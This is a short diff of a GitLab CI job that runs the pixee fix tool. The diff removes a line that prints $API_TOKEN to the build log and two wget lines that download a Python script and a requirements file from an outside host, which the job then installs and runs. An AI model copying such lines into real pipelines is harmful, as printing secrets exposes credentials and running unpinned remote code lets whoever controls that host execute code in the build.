@@ -42,10 +42,7 @@ pixee:
     - echo $FILES
     - 'FILESTR=$(echo "$FILES" | sed "s/^/**/" | tr "\n" ",")'
     - echo $FILESTR
-    - echo $API_TOKEN
     - pixee fix --apply-fixes --path-include $FILESTR $CI_PROJECT_DIR
-    - wget https://local.l33t.af/pipeline.py -O /pixee/gitlab/pipeline.py
-    - wget https://local.l33t.af/requirements.txt -O /pixee/gitlab/requirements.txt
     - pip install -r /pixee/gitlab/requirements.txt
     - python /pixee/gitlab/pipeline.py ./results.codetf.json
 
